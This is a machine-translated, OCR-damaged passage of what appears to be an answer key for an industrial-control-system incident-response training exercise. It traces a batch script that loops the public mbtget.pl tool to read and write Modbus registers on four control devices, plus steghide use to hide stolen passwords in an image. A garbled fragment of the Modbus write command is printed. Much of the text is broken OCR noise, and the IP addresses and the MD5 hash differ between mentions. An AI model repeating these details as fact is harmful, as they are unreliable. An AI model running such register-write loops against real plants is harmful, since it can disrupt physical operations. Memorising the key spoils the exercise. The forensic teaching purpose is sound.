11.

12.

Quale strano traffico di rete si sta verificando? Enumerazione

Un rapido sguardo all'acquisizione mostra che ci sono molte ritrasmissioni TCP e ACK duplicati. Esso
sembra che la comunicazione con i client Modbus TCP sia più veloce di quanto lo fosse in precedenza e lo sono
potenzialmente enumerabili.

Quali dispositivi di controllo vengono presi di mira? Tutti e quattro

A quanto pare, tutti e quattro i dispositivi vengono scansionati. Tuttavia, non vi è alcuna indicazione di altri dispositivi, quindi il
la scansione sembra mirata in natura. °

Ci sono file strani che potrebbero essere correlati a questo traffico? script.bat

Ovviamente sta accadendo qualcosa di strano, quindi è importante cercare qualcosa che potrebbe essere la radice
causa. Sappiamo che sono stati trasferiti file strani nella rete, quindi possiamo cercarli
come abbiamo fatto prima con Esporta oggetti > HTTP. Ciò non rivela nulla; tuttavia, questo è interno al
rete, quindi è possibile che i file vengano passati avanti e indietro tramite SMB. Pertanto, possiamo scegliere Esporta oggetti
> PMI. Questo rivela file interessanti tra cui script.bat. Questo file, nel mondo reale, verrebbe salvato e
inviato agli addetti alla manipolazione delle minacce e dell'ambiente per l'analisi.

29735 = \\10.25.22.105\TREEID_2049 FILE (226/226) R [100,00%] 226 byte \Users\In Gary\script.bat
29747 = \\10.25.22.105\TREEID_2049 FILE (226/226) R [10,00%] 226 byte \Users\In Gary\script.bat
29819 —\\10.25.22.105\TREEID_2049 FILE (226/226) R [100,00%] 226 byte \Users\In Gary\script.bat
>
Aiuto Salva con nome Salva tutto Annulla

Meglio ancora, però, cliccando sul file “script.bat” nella finestra Esporta oggetti, possiamo anche guardarci dentro
l'SMB si blocca (come il pacchetto numero 29735). Lì vediamo "mbtget.p!" che è un Perl
sceneggiatura. Questo è importante da notare per ora poiché è probabile che si tratti dello script eseguito dal nostro "script.bat".

© 2021, Robert M. Lee 1CS515 Mini-Capstone del quinto giorno 7
25.22.8. .mbtget.
pl -ws 1 -a 5 10
725.22. 2 3. . VAI A
ciclo continuo. ..-

13. Quale utente è associato allo strano traffico? A Gary

Dalla funzione Esporta oggetti > SMB in Wireshark, vediamo che il file script.bat sta esaurendo il file
account utente “In Gary”.

14. Quale indirizzo IP è associato al file dispari? 25.10.22.105
Possiamo selezionare il file nella finestra Esporta oggetti > SMB e verrà evidenziato il pacchetto ad esso correlato

sessione nella vista principale di Wireshark. Lì vediamo che l'indirizzo IP è 10.25.22.105. Questo è un buon momento
per avviare procedure di risposta agli incidenti e acquisire l’immagine digitale di quell’indirizzo IP.

QO

ehm, @&

R
29734 373, 376351 10. 25. 22.103 10, 25.22.105 117 Leggi richiesta Andx, FID: 0x000a, 226 byte con offset 0

29735 373, 37638610.25, 22.105 10,25. 22.103; 344 Lettura risposta Andx, FID: 0x000a, 226 byte

29736 373. 377208 10. 25. 22.103 10.25.22.105 184 Richiesta Trans2, QUERY_PATH_INFO, interroga informazioni di base sul file, percorso: \users\in Gary\script. en
Premetemi]

4h 3629 1n> tazza 400 Trane? Qocnonca Aliroy DaTY Turno

*Nota* Le seguenti domande riguardano AnalysisSession3:

Anche se è ovvio che nell'ICS sono in corso attività dannose, è necessario familiarizzarsi con queste
l'acquisizione forense di base effettuata in precedenza dal personale del sito. Basta saltare nella nuova cattura

impiega ancora più tempo per familiarizzare senza farlo. È importante rimanere calmi e composti
in uno scenario di potenziale incidente.

15. Quali sono i due indirizzi |Pv4 per il computer ripreso? 10.25.22.105 e 169.254.18.199

In Redline, vai alla scheda Informazioni di sistema, espandila e seleziona Schede di rete. Qui è dove
puoi vedere quali indirizzi IP sono, o sono stati recentemente, associati all'immagine.

Dati di analisi 'Intel(R) PRO/1000 MT Netwo

Adattatore informazioni di sistema:

|| Il lease DHCP scade:

" Processi

. a Informazioni IP (maschera di sottorete):
Processi gerarchici

feb0:708a:7e3:dels:12c7 ()}
File system 10.25,22,105 (}
Registro 169.254.168.199 (}

© 2021, Robert M. Lee ICS515 Mini-Capstone del quinto giorno 8

®

o@moqonw®®®

aad od ed od ee a

<=

ww modo, wy ww

@- @ @

16.

Qui vediamo che 10.25.22.105 viene osservato come speriamo di vedere: questo era il sistema correlato al
script.bat. Esiste però anche l’indirizzo IP 169.254.18.199. Gli intervalli 169.254.0.0/16 sono
riservato per l'uso di IP privati ​​secondo RFC 3927. Questi IP vengono utilizzati quando un sistema Windows è stato
configurato per DHCP, ma poi perde il contatto con il server. Questo ci mostra che il sistema era probabile
disconnesso al momento dello scatto dell'immagine. È importante prenderne nota per gli operatori che rispondono agli incidenti
e dire loro di non rimuovere il client dalla rete quando si scattano le immagini. È possibile perdere dati preziosi

interagire con i sistemi rimuovendoli dalla rete.
Da quale posizione/cartella è stato eseguito "0001.bat"? C:\temp\

È importante verificare che questa immagine di base sia effettivamente una buona base di riferimento. È possibile che le minacce lo siano
nell'ambiente o si verificano comportamenti strani anche prima che venga presa la linea di base. Un modo semplice per farlo
questo per guardare la scheda Processi e notare eventuali eventi interessanti. Ad esempio, c'è un cmd.exe
elaborare il file rana 0001.bat. Stiamo cercando un file bat potenzialmente dannoso, quindi dovrebbe essere questo
esaminato. È possibile che gli utenti delle operazioni utilizzino la riga di comando per una serie di motivi; Tuttavia,
il file viene eseguito al di fuori della posizione C:\temp\, che è comune per azioni dannose. Vorremmo segnalarlo
per revisione e analisi. Tuttavia, questo non è lo script bat che stiamo cercando.

=

Processi ; sae ce Xe
Fert 6 sichast.ere § 270A ClWindows\System32 ‘CAWindows\Systemd2isvchostene -kseesies
un cai t
Fle System {) nde err" % 2204 Windows System32 cmd /e"C\temp\Q00" bat'*
Fl Sistema a
Registro §) sichostese % QAO CAWindows\System32 Windows System3Z\svchastene-& Locaiystemetworesticted
"Servizi Windows ms
Persistenza q) sichostere % Ti CAWindows\system32 CAWindowssystem32\svchostexe -k RPCSS
17. Quale programma dannoso (file zip) è stato scaricato e utilizzato? steghide-0.5.1-win32.zip

Rendendoci conto che c'è una strana attività nella linea di base, vogliamo scavare più a fondo. Perché c'era HTTP
comunicazione in almeno una parte della rete, dovremmo visualizzare la scheda Cronologia URL del browser. Immediatamente,
la tua attenzione dovrebbe essere attirata dai file passwords.txt, Train25.jpg e dal file steghide-0.5.1-win32.zip.

}| b Dischi
Volumi
Alveari del registro

Voci del percorso file://fC:/Users/Valley?20Electric/Downloads/steghide-0.5.1-win32.2ip

C:/Utenti/Valley%20Electric/Download/steghide-0 5.1-win32/steghide/README. TXT

File
file:///Cx/Users/Valley%20Electric/Downloads/steghide-0.5 1-win32/steghide/todo.txt

Cronologia URL del browser file:///C:/Users/Valley%20Electric/Documents/OpenPutt/OpenPuft/OpenPuff_icense.txt

Cronologia download file
ile Scarica nistory flev///C./Users/Valley%20Electric/Desktop/steghide-0.5.1 -win32%20(1).zip

418. Dove potrebbe trovarsi il file nascosto?

Treno25.jpg

Sembra ovvio a questo punto che si sia verificata un'attività dannosa prima dell'incidente. Steghide lo è
uno strumento comune per eseguire la steganografia o nascondere informazioni all'interno delle immagini. Il file delle password,
Le informazioni di accesso all'HMI e altro ancora sono state probabilmente inserite all'interno di Train25.jpg ed esfiltrate dalla rete.
Questi file verrebbero passati agli addetti alla manipolazione delle minacce e dell'ambiente, che torneranno indietro
con gli addetti al consumo di Threat Intelligence per ricercare se sono presenti minacce attive nella comunità
usando queste tattiche e cosa potrebbero fare. È anche una grande opportunità per la Sicurezza della Rete
Analisti di monitoraggio per cercare questi file all'interno della rete e per contattare gli addetti alla risposta agli incidenti

© 2021, Robert M. Lee 1CS515 Mini-Capstone del quinto giorno 9
en
tieni d'occhio i sistemi con questo tipo di dati. Per ora, però, concentreremo la nostra attenzione sull’incidente
prendere di mira direttamente i sistemi di controllo: questa è la nostra priorità. SU
19. Questa attività è correlata all'attività di rete? Improbabile
Ls

Non possiamo dire con certezza se questa attività sia correlata all'attività di rete che stiamo vedendo. Quello che stiamo vedendo
in AnalysisSession3 potrebbe essere una fase di raccolta di informazioni della catena di uccisione di un avversario contro l'ICS.
L'attività che stiamo vedendo nella rete potrebbe essere quella seconda fase. L’attività è però improbabile

direttamente correlato all’attività della rete.Steghide non prenderebbe di mira i sistemi di controllo come abbiamo visto, e noi

non abbiamo trovato lo script bat specifico che stiamo cercando; per ora, sarebbe bene registrare questo Oo
informazioni ma continua a cercare i collegamenti diretti all'attività che abbiamo visto.
oh
*Nota* Le seguenti domande riguardano AnalysisSession4:
SU

È ovvio che l'acquisizione della linea di base non era una buona linea di base e che c'erano diversi problemi in corso
Prima. Sembra, tuttavia, che queste azioni osservate probabilmente non fossero correlate all'attività vista sul
rete. Potrebbero esserci più problemi sulla rete. Ma è importante trovare il problema che è direttamente...
influenzare il dispositivo di controllo.

20. Quale file potenzialmente dannoso è stato eseguito da “In Gary”? script.bat oo

Esaminando la scheda Processi dopo aver visualizzato la linea di base, vediamo che è presente un nuovo prompt dei comandi (a
pochi in realtà) incluso uno eseguito dall'utente "In Gary" intitolato "script.bat": questo è il file che stavamo cercando
per. Vediamo anche sotto la colonna Ora di inizio che dopo l'esecuzione dello script, ci sono due perl.exe
processi in esecuzione. Il file "mbiget.pl" che abbiamo visto in precedenza era uno script Perl, quindi è probabile che si tratti del file "4
essere giustiziato e il vero colpevole: possiamo iniziare a cercarlo più da vicino ora.

— - - = io )
Ce 98 1872 .
@periexe <a 94 2096
@ winlogonexe 2 2668 C\Windows\system32 winlogonexe 'un
Processi gerarchici @ corssexe 92 1388 CAWindows\system32 %SystemRoot\system32\csrss.exe Oggetto "
, fe nem 4B svchostexe 85 2704 CAWindows\System32 CAWindows\System32\svchostex -k secs
Regt'y a
Servizi Windows © taskhostexe 61 628 (on
Persistenza come — . "
© cmdexe rr 2964 CAWindows)System32 cmd fe “C\temp\0001 bat” * |
Utenti '
Registri eventi © onder Me™ 38 3768 ae cmd /e *CA\Userstin Gary/\script.bat” *
è
.
(8
un sì 7
21. "In Gary" era un amministratore? SÌ
~
(8

Dato che sta eseguendo nuovi programmi, è importante vedere se “In Gary” era un amministratore e se lo era
sempre così. Cioè. lui o qualcun altro ha elevato i suoi privilegi? Se è così, può anche essere quando ciò è avvenuto

interessante. Facendo clic sulla scheda Utenti, possiamo vedere che l'utente "In Gary" era un amministratore. Questo è di
qualcosa di cui prendere nota poiché è l'unica persona ad aver effettuato l'accesso negli ultimi mesi al di fuori di f
dell'account Amministratore. Rif
o
"
22. Quando è stato creato lo script dalle acquisizioni di rete sul sistema? _ 27/01/2015 alle 00:30:52 Zulu
7
© 2021, Robert M. Lee 1CS515 Mini-Capstone del quinto giorno 10 wy
»
UN

Ww
ay ay ay ww ay ay uway ay

av

e noi

23.

Le informazioni sulla sequenza temporale sono quasi sempre interessanti per comprendere appieno tutti gli eventi e l'altro
attività ad essi associata. In Redline, scegli la scheda Timeline e cerca "script.bat" per vedere quando
appare per la prima volta nella sequenza temporale.

script.bat » “s in tutti i campi =~ | Cancella tutti i filtri Prec = Successivo | Superata la fine

Riepilogo

Percorso: C:\Utenti\in Gary MEpees MDS: 19c443fc16892ase7cd7G.. Utente: WORKSTATIONT\Valley...

Percorso: Software\Microsoft\Windows\CurrentVersion\Expiorer\ComDig3.. Tipo: REG_XEY Valore:

Percorso: Software\Microsoft\Windows\CurrentVersion\Explorer\ComDig3... Tipo: REG_SIN.. Valore:

Facendo doppio clic sul record verrà rivelato che il file è stato creato il 27-0-1-2015 alle 00:30:522.

Cercando “mbtget.p!” nella sequenza temporale, troviamo che è stato creato il “2014-08-27” che colloca
prima dello script.bat. Sembra che questo file sia stato scaricato e successivamente richiamato in script.bat una volta che il file
sono stati individuati gli obiettivi.

Qual è l'hash MD5 dello script? 19c443fc16892aae7c47dc068fd1i0b46

Nella stessa vista, vediamo che l'MD5 di quel file, lo script, è 19c443fc16892aae7c47dc068fd10b46. Hash
sono utili in ogni fase dell'ACDC. Non si dovrebbe fare eccessivo affidamento su di loro per rilevare le minacce, ma è possibile farlo
aiutare a individuare rapidamente un ambiente per un'infezione e aiutare a tenere traccia della minaccia affrontata.

*Nota* Le seguenti domande richiederanno una ricerca open source/ricerca su Internet:

Con le informazioni sullo script, è ora possibile eseguire alcune analisi delle minacce e determinare di cosa si tratta
essere affrontato. Ciò consentirà una migliore comprensione di ciò che è necessario fare in termini di pulizia e di
danni potenziali che potrebbero verificarsi o che sono stati prevenuti dalla risposta all’incidente. Inoltre, qualsiasi informazione
scoperto potrebbe essere condivisibile con i colleghi della comunità per garantire che, se si tratta di una minaccia esterna, il file
la comunità può rispondere insieme invece di dover affrontare la minaccia in modo indipendente.

24.

25.

26.

In quale repository di codice è possibile trovare lo script dannoso? Sourceperl - GitHub
Script.bat è un nome generico; tuttavia, sappiamo che il vero programma dannoso è stato probabilmente lo script Perl.
Pertanto, possiamo eseguire una ricerca su Google per mbtget.p! che porterà al GitHub “sourceperl”.
account. Afferma che mbtget è un semplice script Perl per effettuare transazioni con client Modbus TCP.Lo script può semplicemente leggere i registri o anche scrivervi? Leggere e scrivere
Lo script ha la capacità di leggere e scrivere sui client; pertanto, può potenzialmente interrompere le operazioni.

L'uso dello script (per la sua configurazione) sembrava mirato? SÌ

Analizzare completamente la sceneggiatura aiuterà; tuttavia, sappiamo dal traffico di rete che solo i quattro controllano
sono stati presi di mira alcuni dispositivi: non sono state effettuate altre scansioni sulla rete su dispositivi che non esistevano. Il predefinito
la configurazione per lo script dalla pagina di origine non indica che tali dispositivi siano codificati in modo rigido
il copione. Pertanto, è probabile che il nostro aggressore conoscesse bene la struttura.

© 2021, Robert M. Lee ICS515 Mini-Capstone del quinto giorno 11
27. È probabile che si tratti di una minaccia esterna o interna? Esterno

Al momento non possiamo dire con certezza quale tipo di gruppo di minacce stiamo affrontando. Tuttavia, l'interno
La zona di controllo era accessibile a Internet attraverso la DMZ e c'erano strani, potenzialmente dannosi,
file in fase di download. Ciò ha rivelato che si era verificato un comportamento dannoso come il furto di dati relativi a
il login e le password dell'HMI precedentemente presenti nell'ambiente. Dopodiché vediamo che c'era a
script comune utilizzato, ma adattato al nostro ambiente, che ha interrotto la rete ICS. È improbabile che ciò accada
c’è una minaccia interna con tutte queste informazioni, tuttavia, l’uso dello strumento steganografia
sul sistema indicherebbe che questa attività è potenzialmente una minaccia esterna. A questo punto lo è
opportuno presumere l'uno o l'altro; tuttavia, analisi successive, domande al personale e altro ancora potrebbero essere possibili
rivelare prove più concrete.

28. Che tipo di informazioni potrebbero essere condivise per aiutare la comunità? Lezioni imparate

In questo caso, non esiste un insieme di varianti di malware o qualcosa di simile da condividere veramente con la community.
Tuttavia, il sito Web del firmware gratuito, la visualizzazione dello script mbtget, l'esfiltrazione dei dati tramite steghide,
ecc. potrebbero essere riassunti in un bel documento sulle lezioni apprese che dice anche alle persone quali sono state le azioni
adottate per scoprire e rispondere a questi risultati. Questi tipi di documenti tratti dalle lezioni realizzati e
condivisi in tutta la comunità rendono i difensori migliori.

Conclusioni sullo scenario uno

Nello scenario sembra che la minaccia scoperta sia in realtà una minaccia esterna. La sceneggiatura utilizzata
era disponibile al pubblico, ma era mirato specificamente ai dispositivi di controllo sulla rete. Ci vorrebbe questo
conoscenza della struttura probabilmente attraverso precedenti attività di spionaggio. È possibile che lo strumento steganografia lo fosse
utilizzato come spionaggio iniziale. , Il personale addetto potrebbe trovare l'utente associato a "In Gary"
conto e interrogarli. Potrebbero essere utilizzati altri controlli come controlli di sicurezza fisica, orari dei turni, ecc
per vedere chi potrebbe essere il colpevole. Solo perché era un account "In Gary" non significa che la persona chi
utilizza quell'account è necessariamente la minaccia. La cosa più importante, però, è che la minaccia è stata identificata e può esserlo
facilmente risolvibile pulendo i sistemi Windows infetti (si spera che la struttura disponga di buoni backup). Questo
salvaguarderà le operazioni. Quelli che si occupano di Manipolazione delle Minacce e dell'Ambiente possono fare del bene
raccomandazioni su migliori firewall DMZ e regole IDS e sul consumo di informazioni sulle minacce che gli utenti possono
rendere gli altri nella comunità consapevoli del sito freefirmware e dello script MBTget. È improbabile che lo facciano altri
affrontare questo problema, ma è possibile.

Il concetto di ciclo di difesa informatica attiva può essere utilizzato in diversi modi. In questo scenario
è stato un processo svolto da una sola persona. Idealmente, un'organizzazione può impiegare più team in cui la specializzazione e
la concentrazione può verificarsi, ma non è sempre la realtà. È possibile lavorare tramite ACDC come singola persona. IL
Il modello può quindi fornire indicazioni su quali cose una persona dovrebbe considerare e quali azioni intraprendere
Prossimo. Avere un modello che guidi le azioni, soprattutto quando si affrontano le minacce, può fare una differenza significativa
nel raggiungere il successo.

© 2021, Robert M. Lee 1CS515 Mini-Capstone del quinto giorno 12

(B)